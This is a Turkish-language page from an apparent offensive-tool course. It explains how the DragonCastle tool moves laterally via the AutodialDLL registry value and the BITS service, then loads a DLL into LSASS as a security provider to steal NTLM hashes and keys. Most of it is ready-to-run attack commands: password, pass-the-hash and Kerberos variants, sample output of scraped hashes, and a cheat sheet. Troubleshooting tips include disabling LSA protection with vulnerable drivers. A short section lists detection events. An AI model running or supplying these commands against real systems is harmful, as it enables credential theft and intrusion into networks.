# DragonCastle

> **Kategori:** [7. Bellek Analizi, LSASS ve DPAPI Hasadı](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Windows `AutodialDLL` kayıt defteri mekanizmasını ve BITS servisini istismar ederek uzak hedef makinelerde yanal hareket gerçekleştiren, özel bir DLL'i LSASS sürecine Güvenlik Destek Sağlayıcısı (SSP) olarak enjekte edip bellekten NTLM hash'lerini ve AES/3DES oturum anahtarlarını sıyıran Python tabanlı gelişmiş istismar aracı.

---

## 1. Genel Bakış ve Amaç

LSASS bellek dökümü almak (`MiniDumpWriteDump`, `OpenProcess`), modern EDR ve SIEM sistemlerinin en hassas olduğu tespit alanıdır. Doğrudan LSASS'a açılan okuma kolları (handles) anında engellenir. Bu engeli aşmak için APT grupları ve ileri düzey kırmızı takımlar, Windows'un meşru servis başlatma mekanizmalarını kullanarak LSASS'ın **kendi isteğiyle kötü amaçlı bir DLL'i yüklemesini** sağlar.

**`DragonCastle`** (Juan Manuel Fernández - @TheXC3LL tarafından geliştirilen), APT grubu Dragon Castling tarafından kullanılan teknikleri simüle eden bir operasyonel araçtır. Araç şu aşamalarla çalışır:
1. Uzaktaki hedef makinenin dosya sistemine bir kazıyıcı DLL yükler (`C:\dump.dll`).
2. Kayıt defterinde `HKLM\System\CurrentControlSet\Services\RasMan\Parameters\AutodialDLL` anahtarını uzaktan güncelleyerek yüklenen DLL'i gösterir.
3. Windows Arka Plan Akıllı Aktarım Hizmeti'ni (BITS) yeniden başlatır. BITS servisi (`svchost.exe`) `AutodialDLL` kaydını okuyarak DLL'i hafızaya alır.
4. DLL, `AutodialDLL` kaydını anında orijinal haline geri döndürür ve yerel bir RPC çağrısı yaparak `lsass.exe` sürecini aynı DLL'i bir **Güvenlik Desteği Sağlayıcısı (SSP)** olarak yüklemeye zorlar.
5. DLL, LSASS belleğine sızdığında hafızadaki NTLM karmalarını ve oturum şifreleme anahtarlarını (Key/IV) kazıyıp saldırgana iletir.
6. İşlem bittiğinde `DllMain` sürekli `FALSE` döndürerek DLL'in süreçler tarafından kilitlenmesini engeller ve temiz bir şekilde silinmesini sağlar.

### Mimari Akış Şeması

```
[ Saldırgan / DragonCastle ]                     [ Uzak Hedef Windows Makine ]                      [ Hedef lsass.exe ]
            │                                                  │                                             │
            ├─── (1) DLL Dosyası Yükleme (SMB) ───────────────►│ (C:\Windows\Temp\dump.dll)                  │
            │                                                  │                                             │
            ├─── (2) Remote Registry Modifikasyonu ───────────►│ AutodialDLL = C:\Windows\Temp\dump.dll      │
            │                                                  │                                             │
            ├─── (3) BITS Servisini Yeniden Başlat (SCM) ─────►│ svchost.exe (BITS) başlar                  │
            │                                                  │ svchost.exe -> dump.dll'i yükler            │
            │                                                  │                                             │
            │                                                  ├─── (4) Yerel RPC Çağrısı (SSP Yükleme) ────►│
            │                                                  │                                             │ lsass.exe -> dump.dll'i
            │                                                  │                                             │ bir SSP olarak yükler!
            │                                                  │                                             │
            │                                                  │◄── (5) NTLM Hash & AES Key Kazıma ──────────┤
            │◄── (6) NTLM Karmaları ve Sonuçlar Alınır ────────┴─────────────────────────────────────────────┘
```

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

```bash
python3 dragoncastle.py -u <KULLANICI> -p <PAROLA> -d <DOMAIN> -target-ip <HEDEF_IP> [SEÇENEKLER]
```

### Desteklenen Kritik Bayraklar

| Parametre | Açıklama | Örnek Değer |
|---|---|---|
| `-target-ip` | Hedef Windows makinesinin IP adresi | `-target-ip 192.168.56.20` |
| `-u, --username` | Uzak sistemde yönetici haklarına sahip kullanıcı adı | `-u vagrant` |
| `-p, --password` | Kullanıcı parolası | `-p 'vagrant'` |
| `-d, --domain` | Etki alanı adı | `-d WINTERFELL` |
| `-hashes` | Parola yerine kullanılacak LM:NT karması | `-hashes :58a478e...` |
| `-k` | Kerberos kimlik doğrulaması kullanır (CCACHE bileti gerektirir) | `-k` |
| `-local-dll` | Saldırgan makinesindeki kaynak DLL dosya yolu | `-local-dll /opt/DragonCastle.dll` |
| `-remote-dll` | Hedef makinede DLL'in yükleneceği geçici disk konumu | `-remote-dll "C:\dump.dll"` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Uzak Makineden Parola ile NTLM Kazıma

```bash
# Hedef sisteme uzaktan AutodialDLL enjeksiyonu yaparak hash kazıma
python3 dragoncastle.py -u "admin" -p "P@ss123!" -d "corp.local" -target-ip 10.0.0.25 -local-dll DragonCastle.dll -remote-dll "C:\Windows\Temp\ssp.dll"
```

*Çıktı Analizi:*
```text
[*] Uploading local DLL to remote host: C:\Windows\Temp\ssp.dll...
[*] Modifying remote registry: AutodialDLL -> C:\Windows\Temp\ssp.dll
[*] Restarting BITS service via RPC/SCM...
[*] svchost.exe successfully triggered!
[*] Forcing LSASS to load the DLL via Security Support Provider interface...
[+] Scraped NTLM hashes from LSASS memory:
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    svc_backup:1105:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
[*] Restoring original AutodialDLL registry value...
[*] Removing dropped DLL: C:\Windows\Temp\ssp.dll...
[+] Operation Completed Cleanly!
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı | Olası Kök Neden | Çözüm Adımı |
|---|---|---|
| `Failed to inject into LSASS: RunAsPPL is enabled` | Hedef sistemde LSA Koruması (RunAsPPL) açıktır; imzasız SSP yüklenemez. | PPLKiller / BYOVD sürücüsüyle PPL korumasını kaldırın veya DPAPI hasadına geçin. |
| `Registry access denied` | Uzak Kayıt Defteri Servisi (RemoteRegistry) kapalıdır veya UAC kısıtlaması vardır. | Servisi uzaktan başlatın: `sc.exe \\<IP> start RemoteRegistry` veya WMI kullanın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

### 5.1 Bırakılan İzler
* **Sysmon Event ID 13 (RegistryEvent):** `HKLM\System\CurrentControlSet\Services\RasMan\Parameters\AutodialDLL` değerinin değiştirilmesi.
* **Sysmon Event ID 7 (ImageLoaded):** `svchost.exe` ve ardından `lsass.exe` süreçlerine geçici DLL dosyasının yüklenmesi.

### 5.2 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım |
|---|---|---|
| **[T1547.005](https://attack.mitre.org/techniques/T1547/005/)** | Boot or Logon Autostart Execution: Security Support Provider | LSASS'a özel SSP yükleyerek bellek hasadı. |
| **[T1112](https://attack.mitre.org/techniques/T1112/)** | Modify Registry | AutodialDLL kayıt defteri anahtarının manipülasyonu. |

---

## 6. En Çok Kullanılan Komutlar (Cheat Sheet)

```bash
# 1. Parola ile uzaktan NTLM hash kazıma
python3 dragoncastle.py -u admin -p Pass123 -d corp.local -target-ip 10.0.0.15 -local-dll dump.dll -remote-dll "C:\dump.dll"

# 2. Pass-the-Hash ile çalıştırma
python3 dragoncastle.py -u admin -hashes :31d6cfe... -d corp.local -target-ip 10.0.0.15 -local-dll dump.dll -remote-dll "C:\dump.dll"

# 3. Kerberos bileti (CCACHE) kullanarak parola sormadan çalıştırma
export KRB5CCNAME=/tmp/admin.ccache
python3 dragoncastle.py -k -no-pass -d corp.local -target-ip 10.0.0.15 -local-dll dump.dll -remote-dll "C:\dump.dll"
```

---

## Kaynaklar
- [GitHub — DragonCastle (TheXC3LL)](https://github.com/TheXC3LL)
- [Beyond Good Ol' Run Key: Part 24 - AutodialDLL](https://www.hexacorn.com/blog/)

---

> **Önceki:** [← PPLMedic & PPLDump](./PPLMedic_PPLDump.md) · **Sonraki:** [Mimikatz →](./Mimikatz.md)
